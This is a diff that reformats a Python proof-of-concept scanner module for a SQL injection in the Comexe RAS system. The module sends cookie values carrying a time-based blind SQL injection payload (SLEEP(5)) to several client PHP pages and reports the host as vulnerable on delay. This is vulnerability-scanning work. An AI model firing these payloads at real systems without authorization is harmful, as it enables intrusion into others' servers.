@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Comexe_0002' # 平台漏洞编号，留空
+    vuln_id = 'Comexe_0002'  # 平台漏洞编号，留空
     name = '科迈RAS系统 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         科迈RAS系统，函数过滤不全导致SQL注射。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '科迈RAS系统'  # 漏洞应用名称
     product_version = '科迈RAS系统'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '4aac2340-8487-4e9a-bd22-144b204729b6'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             urls = [
                 "/Client/CmxList.php",
@@ -44,13 +46,13 @@ class Poc(ABPoc):
                 cookie = "RAS_UserInfo_UserName=testvul'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(0)))JarV)%20AND%20'aSBL'='aSBL"
                 cookie1 = "RAS_UserInfo_UserName=testvul'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))JarV)%20AND%20'aSBL'='aSBL"
                 t1 = time.time()
-                code1, _, _, _, _ = hh.http(url,cookie=cookie)
+                code1, _, _, _, _ = hh.http(url, cookie=cookie)
                 true_time = time.time() - t1
                 t2 = time.time()
-                code2, _, res, _, _ = hh.http(url,cookie=cookie1)
+                code2, _, res, _, _ = hh.http(url, cookie=cookie1)
                 false_time = time.time() - t2
-                if code1==200 and code2 == 200 and false_time-true_time>4.5:
-                    #security_hole(url)
+                if code1 == 200 and code2 == 200 and false_time-true_time > 4.5:
+                    # security_hole(url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -59,6 +61,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
